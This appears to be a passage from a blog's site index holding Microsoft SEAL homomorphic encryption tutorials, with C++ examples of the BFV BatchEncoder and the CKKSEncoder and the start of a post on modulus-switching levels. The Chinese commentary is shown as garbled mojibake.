ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,&quot;æ‰¹é‡å¤„ç†&quot;ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ° plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree) batch_encoder.encode(pod_matrix, plain_matrix); ç®€å•æ ·ä¾‹éªŒè¯ ç”ŸæˆçŸ©é˜µAå’ŒçŸ©é˜µB çŸ©é˜µAå½¢å¼: [ 0, 1, 2, 3, 0, 0, ..., 0 ] [ 4, 5, 6, 7, 0, 0, ..., 0 ] çŸ©é˜µBå½¢å¼ï¼š [ 1, 2, 1, 2, 1, 2, ..., 2 ] [ 1, 2, 1, 2, 1, 2, ..., 2 ] æ±‚ (A+B)^2 å¹¶éªŒè¯ç»“æœ code vector&lt;uint64_t> pod_matrix(slot_count, 0ULL); // pod_matrix[0] = 0ULL; pod_matrix[1] = 1ULL; pod_matrix[2] = 2ULL; pod_matrix[3] = 3ULL; pod_matrix[row_size] = 4ULL; pod_matrix[row_size + 1] = 5ULL; pod_matrix[row_size + 2] = 6ULL; pod_matrix[row_size + 3] = 7ULL; /* é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨BatchEncoderå°†çŸ©é˜µç¼–ç æˆä¸€ä¸ªæ˜æ–‡å¤šé¡¹å¼ã€‚ */ Plaintext plain_matrix; print_line(__LINE__); cout &lt;&lt; \"Encode plaintext matrix:\" &lt;&lt; endl; /* ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,\"æ‰¹é‡å¤„ç†\"ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ° plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree) */ batch_encoder.encode(pod_matrix, plain_matrix); /* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åŠ å¯†å·²ç¼–ç çš„æ˜æ–‡ã€‚ */ Ciphertext encrypted_matrix; print_line(__LINE__); cout &lt;&lt; \"Encrypt plain_matrix to encrypted_matrix.\" &lt;&lt; endl; encryptor.encrypt(plain_matrix, encrypted_matrix); cout &lt;&lt; \" + Noise budget in encrypted_matrix: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; /* * å¯¹å¯†æ–‡çš„æ“ä½œå¯¼è‡´åœ¨æ‰€æœ‰8192(poly_modulus_degree)ä¸ªslot(çŸ©é˜µå…ƒç´ )ä¸­åŒæ—¶æ‰§è¡ŒåŒæ€æ“ä½œã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ„é€ äº†å¦ä¸€ä¸ªæ˜æ–‡çŸ©é˜µï¼š [ 1, 2, 1, 2, 1, 2, ..., 2 ] [ 1, 2, 1, 2, 1, 2, ..., 2 ] ç„¶åæŠŠå®ƒç¼–ç æˆæ˜æ–‡ã€‚ */ vector&lt;uint64_t> pod_matrix2; for (size_t i = 0; i &lt; slot_count; i++) &#123; pod_matrix2.push_back((i &amp; size_t(0x1)) + 1); &#125; Plaintext plain_matrix2; batch_encoder.encode(pod_matrix2, plain_matrix2); cout &lt;&lt; endl; cout &lt;&lt; \"Second input plaintext matrix:\" &lt;&lt; endl; print_matrix(pod_matrix2, row_size); /* ç°åœ¨æˆ‘ä»¬å°†ç¬¬äºŒä¸ª(æ˜æ–‡)çŸ©é˜µæ·»åŠ åˆ°åŠ å¯†çŸ©é˜µä¸­ï¼Œå¹¶æ±‚sum^2ã€‚ */ print_line(__LINE__); cout &lt;&lt; \"Sum, square, and relinearize.\" &lt;&lt; endl; evaluator.add_plain_inplace(encrypted_matrix, plain_matrix2); // encrypted_matrix = ncrypted_matrix + plain_matrix2 evaluator.square_inplace(encrypted_matrix);// encrypted_matrix = encrypted_matrix * encrypted_matrix; evaluator.relinearize_inplace(encrypted_matrix, relin_keys); // åºåˆ—åŒ– /* æŸ¥çœ‹å‰©ä½™å™ªéŸ³é¢„ç®— */ cout &lt;&lt; \" + Noise budget in result: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; /* æˆ‘ä»¬å°†åŠ å¯†çš„ æ•°æ®è¿›è¡Œè§£å¯†å¹¶è§£ç å¹¶éªŒè¯ç»“æœ */ Plaintext plain_result; print_line(__LINE__); cout &lt;&lt; \"Decrypt and decode result.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_result); print_matrix(pod_result, row_size); // éªŒè¯ç»“æœ æ€»ç»“ï¼š å½“æ‰€éœ€çš„åŠ å¯†è®¡ç®—é«˜åº¦å¯å¹¶è¡ŒåŒ–æ—¶ï¼Œæ‰¹å¤„ç†å…è®¸æˆ‘ä»¬æœ‰æ•ˆåœ°ä½¿ç”¨å…¨æ˜æ–‡å¤šé¡¹å¼ã€‚ä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰è§£å†³è¿™ä¸ªæ–‡ä»¶å¼€å¤´æåˆ°çš„å¦ä¸€ä¸ªé—®é¢˜:æ¯ä¸ªæ§½åªåŒ…å«ä¸€ä¸ªæ•´æ•°æ¨¡çš„æ˜æ–‡æ¨¡é‡ï¼Œé™¤éæ˜æ–‡æ¨¡é‡éå¸¸å¤§ï¼Œå¦åˆ™æˆ‘ä»¬å¯ä»¥å¾ˆå¿«é‡åˆ°æ•°æ®ç±»å‹æº¢å‡ºï¼Œå¹¶åœ¨éœ€è¦æ•´æ•°è®¡ç®—æ—¶ä¼šå¾—åˆ°æ„å¤–çš„ç»“æœã€‚æ³¨æ„ï¼Œæº¢å‡ºå¹¶ä¸èƒ½ä»¥åŠ å¯†çš„å½¢å¼æ£€æµ‹åˆ°ã€‚CKKSæ–¹æ¡ˆ(ä»¥åŠCKKSEncoder)è§£å†³äº†æ•°æ®ç±»å‹æº¢å‡ºé—®é¢˜ï¼Œä½†ä»£ä»·æ˜¯åªäº§ç”Ÿè¿‘ä¼¼çš„ç»“æœã€‚ CKKSEncoder [CKKSEncoder] (For CKKS scheme only) å®æ•°æˆ–å¤æ•°å½¢å¼ (1) CKKSä¸ä½¿ç”¨plain_modulusåŠ å¯†å‚æ•°; (2) å½“ä½¿ç”¨CKKSæ–¹æ¡ˆæ—¶,é€‰æ‹©coeff_modulusæ˜¯éå¸¸é‡è¦çš„ å£°æ˜æ–¹å¼ åŒbfvä¸€è‡´ï¼Œ EncryptionParameters parms(scheme_type::ckks);// ä½¿ç”¨ckks size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 40, 40, 40, 40, 40 &#125;));// äº§ç”Ÿ5ä¸ª40ä½çš„ç´ æ•°çš„æ•°ç»„ CKKS ä¸­ slotæ•°ç›® = poly_modulus_degree / 2 æ¯ä¸ªslotç¼–ç ä¸ºä¸€ä¸ªå®æ•°æˆ–å¤æ•°ã€‚ è€Œåœ¨BFVä¸­ slot = poly_modulus_degree å¹¶ä¸”è¢«å¤„ç†æˆ ä¸€ä¸ª2X(N/2)çš„çŸ©é˜µ size_t slot_count &#x3D; encoder.slot_count(); è¦åˆ›å»ºCKKSçº¯æ–‡æœ¬ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„ç¼–ç å™¨: BatchEncoderä¸é€‚ç”¨äºCKKS CKKSEncoder çš„æ–¹å¼æ˜¯å°†å®æ•°æˆ–å¤æ•°çš„å‘é‡ç¼–ç ä¸ºPlaintext objects ç„¶åå¯¹objectå°±å¯ä»¥åŠ å¯†äº† å‡½æ•°è°ƒç”¨ å‚æ•°ç±»å‹ è§£é‡Šè¯´æ˜ CKKSEncoder encoder(context); SEALContext å£°æ˜ä¸€ä¸ªCKKSç¼–ç å™¨ encoder.encode(input, scale, plain); Vector,scale,Plaintext å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext encoder.decode(plain, output); Plaintextï¼ŒVector å°†æ˜æ–‡Plaintextè§£å¯†æˆVector ç¼–ç ä¸è§£ç  Plaintext plain; double scale = pow(2.0, 30); print_line(__LINE__); cout &lt;&lt; \"Encode input vector. and the size of scale: \"&lt;&lt; scale &lt;&lt; endl; encoder.encode(input, scale, plain); // å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext /* æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥æ£€æŸ¥ç¼–ç çš„æ­£ç¡®æ€§ã€‚ */ vector&lt;double> output; cout &lt;&lt; \" + Decode input vector ...... Correct.\" &lt;&lt; endl; encoder.decode(plain, output); // è§£ç  print_vector(output); åšä¸ªç®€å•æ ·ä¾‹éªŒè¯ï¼Œ å°†è¾“å…¥çš„vectoråŠ å¯†å æ±‚å¹³æ–¹ å¹¶ åºåˆ—åŒ–å è§£ç éªŒè¯ç»“æœ code /* The vector is encrypted the same was as in BFV. ç®€å•æ ·ä¾‹: å°†è¾“å…¥çš„ vector åŠ å¯†å æ±‚å¹³æ–¹ å¹¶ åºåˆ—åŒ– */ Ciphertext encrypted; print_line(__LINE__); cout &lt;&lt; \"Encrypt input vector, square, and relinearize.\" &lt;&lt; endl; encryptor.encrypt(plain, encrypted); // åŠ å¯† Plaintext -> Ciphertext // è®¡ç®— evaluator.square_inplace(encrypted); // encrypted = encrypted * encrypted evaluator.relinearize_inplace(encrypted, relin_keys); // åºåˆ—åŒ– cout &lt;&lt; \" + Scale in squared input: \" &lt;&lt; encrypted.scale() &lt;&lt; \" (\" &lt;&lt; log2(encrypted.scale()) &lt;&lt; \" bits)\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Decrypt and decode.\" &lt;&lt; endl; decryptor.decrypt(encrypted, plain); // è§£å¯† encoder.decode(plain, output); // è§£ç  cout &lt;&lt; \" + Result vector ...... Correct.\" &lt;&lt; endl; print_vector(output); // ç»“æœ éªŒè¯ç»“æœæ­£ç¡® å…¨éƒ¨æºä»£ç  code #include \"examples.h\" using namespace std; using namespace seal; void example_batch_encoder() &#123; print_example_banner(\"Example: Encoders / Batch Encoder\"); /* [BatchEncoder] (For BFV scheme only) Let N è¡¨ç¤º poly_modulus_degree ; T è¡¨ç¤º plain_modulus. Batching allows the BFV plaintext polynomials to be viewed as 2-by-(N/2) matrices, with each element an integer modulo T. åœ¨çŸ©é˜µè§†å›¾ä¸­ï¼ŒåŠ å¯†æ“ä½œæ³•æ¡ˆåœ¨åŠ å¯†çš„çŸ©é˜µä¸Š, allowing the user to obtain speeds-ups of several orders of magnitude in fully vectorizable computations. Thus, in all but the simplest computations, batching should be the preferred method to use with BFV, and when used properly will result in implementations outperforming anything done without batching. */ EncryptionParameters parms(scheme_type::bfv); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); parms.set_plain_modulus(PlainModulus::Batching(poly_modulus_degree, 20)); //PlainModulus::Batching(poly_modulus_degree, 20) äº§ç”Ÿ20ä½çš„ç´ æ•° SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; // æ£€æµ‹æ˜¯å¦æˆåŠŸå¯ç”¨ auto qualifiers = context.first_context_data()->qualifiers(); cout &lt;&lt; \"Batching enabled: \" &lt;&lt; boolalpha &lt;&lt; qualifiers.using_batching &lt;&lt; endl; KeyGenerator keygen(context); SecretKey secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); BatchEncoder batch_encoder(context); size_t slot_count = batch_encoder.slot_count(); size_t row_size = slot_count / 2; cout &lt;&lt; \"Plaintext matrix slot_count size: \" &lt;&lt; slot_count &lt;&lt; endl; cout &lt;&lt; \"Plaintext matrix row size: \" &lt;&lt; row_size &lt;&lt; endl; /* * å£°æ˜ä¸€ä¸ªvectorï¼Œé•¿åº¦ä¸ºslot_countï¼Œ é»˜ä¸º 0 * å½¢å¼ä¸ºï¼š 2*(slot_count/2) çš„äºŒç»´çŸ©é˜µ * [0...............row_size] * [row_size......slot_count] */ vector&lt;uint64_t> pod_matrix(slot_count, 0ULL); // pod_matrix[0] = 0ULL; pod_matrix[1] = 1ULL; pod_matrix[2] = 2ULL; pod_matrix[3] = 3ULL; pod_matrix[row_size] = 4ULL; pod_matrix[row_size + 1] = 5ULL; pod_matrix[row_size + 2] = 6ULL; pod_matrix[row_size + 3] = 7ULL; cout &lt;&lt; \"Input plaintext matrix:\" &lt;&lt; endl; /* * è¿™ä¸ªprint_matrixä¸ä¼šæ‰“å°çŸ©é˜µçš„æ¯ä¸€åˆ—,åªæ‰“å°æ¯ä¸€è¡Œçš„å‰5ä¸ªå’Œæœ€å5ä¸ª * [ 0, 1, 2, 3, 0, 0, ..., 0 ] * [ 4, 5, 6, 7, 0, 0, ..., 0 ] */ print_matrix(pod_matrix, row_size); /* é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨BatchEncoderå°†çŸ©é˜µç¼–ç æˆä¸€ä¸ªæ˜æ–‡å¤šé¡¹å¼ã€‚ */ Plaintext plain_matrix; print_line(__LINE__); cout &lt;&lt; \"Encode plaintext matrix:\" &lt;&lt; endl; /* ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,\"æ‰¹é‡å¤„ç†\"ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ° plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree) */ batch_encoder.encode(pod_matrix, plain_matrix); /* æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥éªŒè¯ç¼–ç çš„æ­£ç¡®æ€§. ä½†æ³¨æ„ï¼Œè¿˜æœªè¿›è¡ŒåŠ å¯†æˆ–è§£å¯† */ vector&lt;uint64_t> pod_result; cout &lt;&lt; \" + Decode plaintext matrix ...... Correct.\" &lt;&lt; endl; batch_encoder.decode(plain_matrix, pod_result); print_matrix(pod_result, row_size); /* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åŠ å¯†å·²ç¼–ç çš„æ˜æ–‡ã€‚ */ Ciphertext encrypted_matrix; print_line(__LINE__); cout &lt;&lt; \"Encrypt plain_matrix to encrypted_matrix.\" &lt;&lt; endl; encryptor.encrypt(plain_matrix, encrypted_matrix); cout &lt;&lt; \" + Noise budget in encrypted_matrix: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; /* * å¯¹å¯†æ–‡çš„æ“ä½œå¯¼è‡´åœ¨æ‰€æœ‰8192(poly_modulus_degree)ä¸ªslot(çŸ©é˜µå…ƒç´ )ä¸­åŒæ—¶æ‰§è¡ŒåŒæ€æ“ä½œã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ„é€ äº†å¦ä¸€ä¸ªæ˜æ–‡çŸ©é˜µï¼š [ 1, 2, 1, 2, 1, 2, ..., 2 ] [ 1, 2, 1, 2, 1, 2, ..., 2 ] ç„¶åæŠŠå®ƒç¼–ç æˆæ˜æ–‡ã€‚ */ vector&lt;uint64_t> pod_matrix2; for (size_t i = 0; i &lt; slot_count; i++) &#123; pod_matrix2.push_back((i &amp; size_t(0x1)) + 1); &#125; Plaintext plain_matrix2; batch_encoder.encode(pod_matrix2, plain_matrix2); cout &lt;&lt; endl; cout &lt;&lt; \"Second input plaintext matrix:\" &lt;&lt; endl; print_matrix(pod_matrix2, row_size); /* ç°åœ¨æˆ‘ä»¬å°†ç¬¬äºŒä¸ª(æ˜æ–‡)çŸ©é˜µæ·»åŠ åˆ°åŠ å¯†çŸ©é˜µä¸­ï¼Œå¹¶æ±‚sum^2ã€‚ */ print_line(__LINE__); cout &lt;&lt; \"Sum, square, and relinearize.\" &lt;&lt; endl; evaluator.add_plain_inplace(encrypted_matrix, plain_matrix2); // encrypted_matrix = ncrypted_matrix + plain_matrix2 evaluator.square_inplace(encrypted_matrix);// encrypted_matrix = encrypted_matrix * encrypted_matrix; evaluator.relinearize_inplace(encrypted_matrix, relin_keys); // åºåˆ—åŒ– /* æŸ¥çœ‹å‰©ä½™å™ªéŸ³é¢„ç®— */ cout &lt;&lt; \" + Noise budget in result: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; /* æˆ‘ä»¬å°†åŠ å¯†çš„ æ•°æ®è¿›è¡Œè§£å¯†å¹¶è§£ç å¹¶éªŒè¯ç»“æœ */ Plaintext plain_result; print_line(__LINE__); cout &lt;&lt; \"Decrypt and decode result.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_result); cout &lt;&lt; \" + Result plaintext matrix ...... Correct.\" &lt;&lt; endl; print_matrix(pod_result, row_size); /* å½“æ‰€éœ€çš„åŠ å¯†è®¡ç®—é«˜åº¦å¯å¹¶è¡ŒåŒ–æ—¶ï¼Œæ‰¹å¤„ç†å…è®¸æˆ‘ä»¬æœ‰æ•ˆåœ°ä½¿ç”¨å…¨æ˜æ–‡å¤šé¡¹å¼ã€‚ ä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰è§£å†³è¿™ä¸ªæ–‡ä»¶å¼€å¤´æåˆ°çš„å¦ä¸€ä¸ªé—®é¢˜: æ¯ä¸ªæ§½åªåŒ…å«ä¸€ä¸ªæ•´æ•°æ¨¡çš„æ˜æ–‡æ¨¡é‡ï¼Œé™¤éæ˜æ–‡æ¨¡é‡éå¸¸å¤§ï¼Œ å¦åˆ™æˆ‘ä»¬å¯ä»¥å¾ˆå¿«é‡åˆ°æ•°æ®ç±»å‹æº¢å‡ºï¼Œå¹¶åœ¨éœ€è¦æ•´æ•°è®¡ç®—æ—¶ä¼šå¾—åˆ°æ„å¤–çš„ç»“æœã€‚ æ³¨æ„ï¼Œæº¢å‡ºå¹¶ä¸èƒ½ä»¥åŠ å¯†çš„å½¢å¼æ£€æµ‹åˆ°ã€‚CKKSæ–¹æ¡ˆ(ä»¥åŠCKKSEncoder)è§£å†³äº†æ•°æ®ç±»å‹æº¢å‡ºé—®é¢˜ï¼Œ ä½†ä»£ä»·æ˜¯åªäº§ç”Ÿè¿‘ä¼¼çš„ç»“æœã€‚ */ &#125; void example_ckks_encoder() &#123; print_example_banner(\"Example: Encoders / CKKS Encoder\"); EncryptionParameters parms(scheme_type::ckks);// ä½¿ç”¨ckks size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 40, 40, 40, 40, 40 &#125;));// äº§ç”Ÿ5ä¸ª40ä½çš„ç´ æ•°çš„æ•°ç»„ // åŒBFVä¸€è‡´ï¼Œå£°æ˜ SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; // å¯†é’¥äº§ç”Ÿçš„æ–¹å¼å’Œ bfv æ˜¯ä¸€æ ·çš„ KeyGenerator keygen(context); auto secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); // åŠ å¯†å™¨ï¼Œè§£å¯†å™¨ï¼Œè®¡ç®—å™¨ Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); /* * è¦åˆ›å»ºCKKSçº¯æ–‡æœ¬ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„ç¼–ç å™¨: BatchEncoderä¸é€‚ç”¨äºCKKS CKKSEncoder çš„æ–¹å¼æ˜¯å°†å®æ•°æˆ–å¤æ•°çš„å‘é‡ç¼–ç ä¸ºPlaintext objects ç„¶åå¯¹objectå°±å¯ä»¥åŠ å¯†äº† çœ‹èµ·æ¥å¾ˆåƒBatchEncoderä¸ºBFVæ–¹æ¡ˆæ‰€åšçš„ï¼Œä½†ç†è®ºä¸Šå®ƒçš„èƒŒåæ˜¯å®Œå…¨ä¸åŒçš„ã€‚ */ CKKSEncoder encoder(context); /* * CKKS ä¸­ slotæ•°ç›® = poly_modulus_degree / 2 æ¯ä¸ªslotç¼–ç ä¸ºä¸€ä¸ªå®æ•°æˆ–å¤æ•°ã€‚ * è€Œåœ¨BFVä¸­ slot = poly_modulus_degree å¹¶ä¸”è¢«å¤„ç†æˆ ä¸€ä¸ª2X(N/2)çš„çŸ©é˜µ */ size_t slot_count = encoder.slot_count(); cout &lt;&lt; \"Number of slots: \" &lt;&lt; slot_count &lt;&lt; endl; vector&lt;double> input&#123; 0.0, 1.1, 2.2, 3.3 &#125;; cout &lt;&lt; \"Input vector: \" &lt;&lt; endl; print_vector(input); /* * ç°åœ¨æˆ‘ä»¬ç”¨CKKSEncoderè¿›è¡Œç¼–ç ã€‚è¾“å…¥çš„æµ®ç‚¹ç³»æ•°å°†é€šè¿‡å‚æ•°â€œscaleâ€æ”¾å¤§ * è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå³ä½¿æ˜¯åœ¨çº¯æ–‡æœ¬å…ƒç´ çš„CKKSæ–¹æ¡ˆ,åŸºæœ¬ä¸Šæ˜¯å¤šé¡¹å¼æ•´æ•°ç³»æ•°ã€‚ * åœ¨CKKSä¸­ï¼Œæ¶ˆæ¯æ˜¯å­˜ MOD coeff_modulus,(è€Œåœ¨BFVä¸­æ˜¯ å­˜å‚¨ MOD plain_modulus) * å› æ­¤ï¼Œç¼©æ”¾åçš„æ¶ˆæ¯ä¸èƒ½å¤ªæ¥è¿‘æ€»å¤§å°coeff_modulusã€‚ * */ Plaintext plain; double scale = pow(2.0, 30); print_line(__LINE__); cout &lt;&lt; \"Encode input vector. and the size of scale: \"&lt;&lt; scale &lt;&lt; endl; encoder.encode(input, scale, plain); // å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext /* æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥æ£€æŸ¥ç¼–ç çš„æ­£ç¡®æ€§ã€‚ */ vector&lt;double> output; cout &lt;&lt; \" + Decode input vector ...... Correct.\" &lt;&lt; endl; encoder.decode(plain, output); // è§£ç  print_vector(output); /* The vector is encrypted the same was as in BFV. ç®€å•æ ·ä¾‹: å°†è¾“å…¥çš„ vector åŠ å¯†å æ±‚å¹³æ–¹ å¹¶ åºåˆ—åŒ– */ Ciphertext encrypted; print_line(__LINE__); cout &lt;&lt; \"Encrypt input vector, square, and relinearize.\" &lt;&lt; endl; encryptor.encrypt(plain, encrypted); // åŠ å¯† Plaintext -> Ciphertext // è®¡ç®— evaluator.square_inplace(encrypted); // encrypted = encrypted * encrypted evaluator.relinearize_inplace(encrypted, relin_keys); // åºåˆ—åŒ– cout &lt;&lt; \" + Scale in squared input: \" &lt;&lt; encrypted.scale() &lt;&lt; \" (\" &lt;&lt; log2(encrypted.scale()) &lt;&lt; \" bits)\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Decrypt and decode.\" &lt;&lt; endl; decryptor.decrypt(encrypted, plain); // è§£å¯† encoder.decode(plain, output); // è§£ç  cout &lt;&lt; \" + Result vector ...... Correct.\" &lt;&lt; endl; print_vector(output); // ç»“æœ /* * CKKSæ–¹æ¡ˆå…è®¸å‡å°‘åŠ å¯†è®¡ç®—ä¹‹é—´çš„è§„æ¨¡ã€‚è¿™æ˜¯CKKSéå¸¸å¼ºå¤§å’Œå…³é”®çš„åŸºæœ¬ç‰¹æ€§çµæ´»ã€‚ * æˆ‘ä»¬å°†åœ¨' 3_levelsä¸­è¯¦ç»†è®¨è®ºå®ƒã€‚cpp'å’Œç¨åâ€œ4 _ckks_basics.cppâ€ã€‚ */ &#125; void example_encoders() &#123; print_example_banner(\"Example: Encoders\"); /* Run all encoder examples. */ //example_batch_encoder(); example_ckks_encoder(); &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"SEALå­¦ä¹ ç¬¬ä¸‰å¤©-Levels","slug":"SEALå­¦ä¹ ç¬¬ä¸‰å¤©-levels","date":"2021-08-11T14:01:36.000Z","updated":"2021-08-14T14:15:24.840Z","comments":true,"path":"posts/51e56618/","link":"","permalink":"https://www.sizaif.com/posts/51e56618/","excerpt":"","text":"@auther by sizaif SEAL å­¦ä¹ ç¬¬ä¸‰å¤©ï¼šlevels @[toc] ç®€ä»‹ ä»Šå¤©å­¦ä¹ æè¿°åœ¨BFVå’ŒCKKSå’Œåœ¨Microsoft SEALä¸­è¡¨ç¤ºå®ƒä»¬çš„ç›¸å…³å¯¹è±¡ åœ¨Microsoft SEALä¸­ï¼Œä¸€ç»„åŠ å¯†å‚æ•°(ä¸åŒ…æ‹¬éšæœºæ•°ç”Ÿæˆå™¨)ç”±å‚æ•°çš„256ä½æ•£åˆ—å”¯ä¸€æ ‡è¯†ã€‚è¿™ä¸ªæ•£åˆ—ç§°ä¸ºâ€™ parms_idâ€™ï¼Œå¯ä»¥åœ¨ä»»ä½•æ—¶å€™æ–¹ä¾¿åœ°è®¿é—®å’Œæ‰“å°ã€‚ä¸€æ—¦ä»»ä½•å‚æ•°å‘ç”Ÿå˜åŒ–ï¼Œæ•£åˆ—å°±ä¼šå‘ç”Ÿå˜åŒ–ã€‚ å½“ä»ç»™å®šçš„EncryptionParameterså®ä¾‹åˆ›å»ºSEALContextæ—¶ï¼Œå¾®è½¯SEALä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ‰€è°“çš„â€œæ¨¡æ•°åˆ‡æ¢é“¾â€ï¼Œå®ƒæ˜¯ä»åŸå§‹é›†åˆè¡ç”Ÿå‡ºæ¥çš„å…¶ä»–åŠ å¯†å‚æ•°é“¾ã€‚æ¨¡é‡äº¤æ¢é“¾ä¸­çš„å‚æ•°é™¤ç³»æ•°æ¨¡é‡æ²¿é“¾å‘ä¸‹é€æ¸å‡å°å¤–ï¼Œå…¶ä½™å‚æ•°å‡ä¸åŸå‚æ•°ç›¸åŒã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œé“¾ä¸­çš„æ¯ä¸ªå‚æ•°é›†éƒ½è¯•å›¾ä»å‰ä¸€ä¸ªé›†åˆä¸­ç§»é™¤æœ€åä¸€ä¸ªç³»æ•°æ¨¡ç´ æ•°;è¿™ä¼šä¸€ç›´æŒç»­åˆ°å‚æ•°é›†ä¸å†æœ‰æ•ˆä¸ºæ­¢ã€‚(ä¾‹å¦‚:plain_moduluså¤§äºå‰©ä½™çš„coeff_modulus)ã€‚å¾ˆå®¹æ˜“éå†æ•´ä¸ªé“¾å¹¶è®¿é—®æ‰€æœ‰å‚æ•°é›†ã€‚æ­¤å¤–ï¼Œé“¾ä¸­è®¾ç½®çš„æ¯ä¸ªå‚æ•°éƒ½æœ‰ä¸€ä¸ªâ€œé“¾ç´¢å¼•â€ï¼ŒæŒ‡ç¤ºå…¶åœ¨é“¾ä¸­çš„ä½ç½®ï¼Œå› æ­¤æœ€åä¸€ç»„å‚æ•°çš„ç´¢å¼•ä¸º0ã€‚æˆ‘ä»¬è¯´ï¼Œä¸€ç»„åŠ å¯†å‚æ•°ï¼Œæˆ–è€…ä¸€ä¸ªæºå¸¦è¿™äº›åŠ å¯†å‚æ•°çš„å¯¹è±¡ï¼Œåœ¨é“¾ä¸­çš„çº§åˆ«é«˜äºå¦ä¸€ç»„å‚æ•°ï¼Œå¦‚æœå®ƒçš„é“¾ç´¢å¼•è¾ƒå¤§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒåœ¨é“¾ä¸­è¾ƒæ—©ã€‚ 